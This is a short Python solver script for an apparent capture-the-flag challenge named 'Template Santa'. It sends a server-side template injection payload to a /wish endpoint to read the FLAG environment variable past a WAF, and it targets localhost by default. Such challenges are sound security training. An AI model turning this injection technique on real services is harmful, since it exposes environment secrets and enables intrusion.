#!/usr/bin/env python3
"""
Template Santa - SSTI Exploit
Payload to extract flag by bypassing WAF filters
"""

import requests
import sys

def exploit(target_url):
    payload = {
        "name": "Hacker",
        "wish": "flag",
        "template": "{$north_pole getenv.FLAG$}"
    }
    
    response = requests.post(f"{target_url}/wish", json=payload)
    data = response.json()
    
    if "HEX{" in data['rendered']:
        flag = data['rendered'].strip()
        print(f"[+] Success! Flag: {flag}\n")
        return flag
    else:
        print(f"[-] Failed. Response: {data['rendered']}")
        return None


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8080"
    
    try:
        flag = exploit(target)
        if flag:
            print(f"üéÖ FLAG: {flag}")
        else:
            print("\n‚ùå Exploit failed. Try manual exploitation.")
            
    except requests.exceptions.ConnectionError:
        print(f"‚ùå Error: Could not connect to {target}")
        print("   Make sure the challenge is running!")
        sys.exit(1)
    except Exception as e:
        print(f"‚ùå Error: {e}")
        sys.exit(1)
